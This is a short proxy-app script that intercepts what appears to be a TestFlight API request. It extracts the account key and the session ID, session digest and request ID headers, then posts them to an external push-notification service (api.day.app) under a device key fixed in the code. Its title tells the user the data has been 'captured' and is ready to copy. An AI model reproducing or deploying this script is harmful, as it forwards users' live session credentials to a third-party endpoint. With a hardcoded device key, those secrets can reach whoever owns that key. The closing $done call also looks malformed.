let url = $request.url
let A_TF_key = url.replace(/(.*accounts\/)(.*)(\/apps)/, '$2')
let A_TF_session_id = $request.headers['x-session-id']
let A_TF_session_digest = $request.headers['x-session-digest']
let A_TF_request_id = $request.headers['x-request-id']
let TF =  "Key:" + A_TF_key + ";" + "Request_id:" + A_TF_request_id + ";" + "Session_digest:" + A_TF_session_digest + ";" + "Session_id:" + A_TF_session_id + ";";
let tongzhi = {
  url: "https://api.day.app/push",
  body: {
	title: "已抓取，请立即下拉后点复制",
	device_key: "mQmpv6johUdatwgYhXvsAL",
	body: TF,
}
};
$httpClient.post(tongzhi)
	$done({ tongzhi });